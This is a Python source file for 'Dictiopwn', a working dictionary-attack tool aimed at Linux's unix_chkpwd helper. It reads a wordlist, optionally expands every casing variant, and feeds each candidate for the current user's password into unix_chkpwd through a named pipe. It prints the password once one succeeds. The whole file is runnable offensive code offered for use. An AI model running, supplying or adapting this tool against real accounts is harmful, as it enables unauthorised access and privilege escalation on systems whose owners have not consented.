#!/usr/bin/env python3
import sys
import os
import pwd
import tempfile
import subprocess
import argparse
import itertools
import colorama
import re
import base64

# Pretty-printing
colorama.init()
PP_LEN = 70
ARG_COLOR = f'{colorama.Fore.LIGHTBLUE_EX}{colorama.Style.BRIGHT}'
ANSI_ESCAPE_REGEX = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
g_in_stage = False

def print_logo() -> None:
    """
        Prints the logo.
    """

    # Clean and print
    os.system('clear')
    print(base64.b64decode(b'G1s5Mm0KICAgICAgICDCt+KWhOKWhOKWhOKWhCAg4paqICAg4paE4paEwrcg4paE4paE4paE4paE4paE4paqICAgICAgICAg4paE4paE4paEwrfiloTiloTilowg4paQIOKWhOKWjCDilpAg4paEIAogICAgICAgIOKWiOKWiOKWqiDilojilogg4paI4paIIOKWkOKWiCDilozilqrigKLilojiloggIOKWiOKWiCDilqogICAgIOKWkOKWiCDiloTilojilojilojCtyDilojilozilpDilojigKLilojilozilpDilogKICAgICAgICDilpDilojCtyDilpDilojilozilpDilojCt+KWiOKWiCDiloTiloQg4paQ4paILuKWquKWkOKWiMK3IOKWhOKWiOKWgOKWhCAg4paI4paI4paAwrfilojilojilqrilpDilojilpDilpDilozilpDilojilpDilpDilowKICAgICAgICDilojiloguIOKWiOKWiCDilpDilojilozilpDilojilojilojilowg4paQ4paI4paMwrfilpDilojilozilpDilojilowu4paQ4paM4paQ4paI4paqwrfigKLilpDilojilozilojilojilpDilojilozilojilojilpDilojilowKICAgICAgICDiloDiloDiloDiloDiloDigKIg4paA4paA4paAwrfiloDiloDiloAgIOKWgOKWgOKWgCDiloDiloDiloAg4paA4paI4paE4paA4paqLuKWgCAgICDiloDiloDiloDiloAg4paA4paq4paA4paAIOKWiOKWqhtbMG0KG1szN20bWzFtICAgICAgICAgRGljdGlvcHduICJ1bml4X2Noa3B3ZCIgZGljdGlvbmFyeSBhdHRhY2sgdG9vbAogICAgICAgICAgIEJ5IEpvbmF0aGFuIEJhciBPciAoIkpCTyIpLCBAeW9feW9feW9famJvCiAgICAgICAgICAgICAgIGh0dHBzOi8veW8teW8teW8tamJvLmdpdGh1Yi5pbwoKG1swbQ==').decode())

def get_title_dots(title:str) -> str:
    """
        Gets dots for the title.
    """

    # Replace colors and calculate dots
    no_color_title = ANSI_ESCAPE_REGEX.sub('', title)
    return '.' * max(PP_LEN - len(no_color_title), 0)

def start_stage(title:str) -> None:
    """
        Starts a stage.
    """

    # Mark we are in a stage
    global g_in_stage
    assert not g_in_stage, Exception('Trying to enter a stage without leaving previous stage')
    g_in_stage = True

    # Write the title
    print(f'{title} ...{get_title_dots(title)} ', end='')

def end_stage(fail_msg:str=None, throw:bool=True) -> None:
    """
        Ends a stage.
    """

    # Mark we are in not a stage
    global g_in_stage
    assert g_in_stage, Exception('Trying to finish a stage without entering a stage')
    g_in_stage = False

    # Write success or failure and also throw in case of a failure
    if fail_msg is None:
        print(f'[  {colorama.Fore.GREEN}{colorama.Style.BRIGHT}OK{colorama.Style.RESET_ALL}  ]')
    else:
        print(f'[ {colorama.Fore.RED}{colorama.Style.BRIGHT}FAIL{colorama.Style.RESET_ALL} ]')
        if throw:
            raise Exception(fail_msg)

def update_stage_title(title:str) -> None:
    """
        Updates a stage title.
    """

    # Validate we are in a stage
    assert g_in_stage, Exception('Trying to change a stage title without an active stage')

    # Write the new title
    print(f'\r' + ' ' * (PP_LEN + 3), end='')
    print(f'\r{title} ...{get_title_dots(title)} ', end='')

def print_extra(data:str, arg_delim:str='"') -> None:
    """
        Prints extra data.
    """

    # Print lines
    for line in data.split('\n'):
        colored_line = '  '
        i = 0
        for chunk in line.split(arg_delim):
            header = f'{colorama.Fore.LIGHTBLACK_EX}{colorama.Style.BRIGHT}' if i % 2 == 0 else ARG_COLOR
            colored_line += f'{header}{chunk}'
            i += 1
        print(f'{colored_line}{colorama.Style.RESET_ALL}')

def find_unix_chkpwd() -> str:
    """
        Finds the path of the "unix_chkpwd" utility.
    """

    # Run the "which" utility
    proc = subprocess.run([ 'which', 'unix_chkpwd' ], stdout=subprocess.PIPE)
    assert proc.returncode == 0, Exception('Could not find "unix_chkpwd" utility')

    # Get the path
    path = proc.stdout.decode().strip()
    assert os.path.isfile(path), Exception(f'Path indicated by "which" utility "{path}" does not exist')
    return path

def get_username() -> str:
    """
        Gets the current username.
    """

    # Get from the read UID
    return pwd.getpwuid(os.getuid())[0]

def attempt_creds(unix_chkpwd_path:str, username:str, pwd:str, pipe_path:str) -> bool:
    """
        Attempts a password for the given username.
    """

    # Handle potential resource leaks
    pipe_fd = None
    stdin = None
    try:

        # Open the pipe for reading and define the standard input for the process
        stdin = os.open(pipe_path, os.O_RDONLY | os.O_NONBLOCK)

        # Write to the pipe
        pipe_fd = os.open(pipe_path, os.O_WRONLY)
        os.write(pipe_fd, pwd.encode() + b'\0')

        # Attempt by running unix_chkpwd
        return 0 == subprocess.call([ unix_chkpwd_path, username, 'nullok' ], stdin=stdin)

    # Cleanup
    finally:

        # Free resources
        if stdin is not None:
            os.close(stdin)
        if pipe_fd is not None:
            os.close(pipe_fd)

def install_pipe() -> str:
    """
        Installs a pipe and returns its path.
    """

    # Install a pipe and return its path
    path = tempfile.mktemp()
    os.mkfifo(path, 0o777)
    return path

def main():
    """
        Main routine.
    """

    # Handle potential errors
    pipe_path = None
    try:

        # Print logo
        print_logo()

        # Parse arguments
        start_stage('Parsing arguments')
        parser = argparse.ArgumentParser('')
        parser.add_argument('-d', dest='dict', required=True, help='the path to the dictionary file')
        parser.add_argument('-c', dest='casing', action='store_true', default=False, help='whether to try all casing options')
        try:
            cmdline_args = parser.parse_args()
        except SystemExit:
            raise Exception('Error parsing arguments')
        end_stage()
        print_extra(f'Using dictionary: "{os.path.basename(cmdline_args.dict)}"')
        casing_mode_text = 'ON' if cmdline_args.casing else 'OFF'
        print_extra(f'Casing mode: "{casing_mode_text}"')

        # Finding utility
        start_stage('Finding the "unix_chkpwd" utility')
        unix_chkpwd_path = find_unix_chkpwd()
        end_stage()
        print_extra(f'Found path: "{unix_chkpwd_path}"')

        # Read the dictionary lines
        start_stage('Reading dictionary')
        with open(cmdline_args.dict, 'r') as fp:
            lines = [ line.strip() for line in fp.readlines() ]
        end_stage()
        print_extra(f'Read entries: "{len(lines)}"')

        # Getting username
        start_stage('Getting username')
        username = get_username()
        end_stage()
        print_extra(f'Got username: "{username}"')

        # Install pipe
        start_stage('Installing pipe')
        pipe_path = install_pipe()
        end_stage()
        print_extra(f'Pipe installed at: "{pipe_path}"')

        # Attempt line by line
        start_stage('Running dictionary attack')
        tries = 0
        for line in lines:

            # Optionally handle all casing options (slow)
            if cmdline_args.casing:
                attempts = list(map(''.join, itertools.product(*zip(line.upper(), line.lower()))))
            else:
                attempts = [ line ]

            # Attempt all
            for attempt in attempts:
                if attempt_creds(unix_chkpwd_path, username, attempt, pipe_path):
                    end_stage()
                    print_extra(f'Got credentials!\nUser: "{username}"\nPassword: "{attempt}"')
                    print(f'> Finished {colorama.Fore.GREEN}{colorama.Style.BRIGHT}SUCCESSFULLY{colorama.Style.RESET_ALL}!\n')
                    return

            # Update progress bar
            tries += 1
            update_stage_title(f'Running dictionary attack ({ARG_COLOR}{tries}{colorama.Style.RESET_ALL} / {ARG_COLOR}{len(lines)}{colorama.Style.RESET_ALL})')

        # Failure due to dictionary exhaustion
        end_stage('Dictionary exhausted')

    # Handle exceptions
    except Exception as ex:
        if g_in_stage:
            end_stage('', throw=False)
        print(f'> {colorama.Fore.RED}{colorama.Style.BRIGHT}ERROR{colorama.Style.RESET_ALL}: {ex}')

    except KeyboardInterrupt:
        if g_in_stage:
            end_stage('', throw=False)
        print(f'> {colorama.Fore.RED}{colorama.Style.BRIGHT}ERROR{colorama.Style.RESET_ALL}: Canceled by user')

    # Cleanup
    finally:

        # Remove pipe
        if pipe_path is not None:
            try:
                os.unlink(pipe_path)
            except:
                pass

if __name__ == '__main__':
    main()

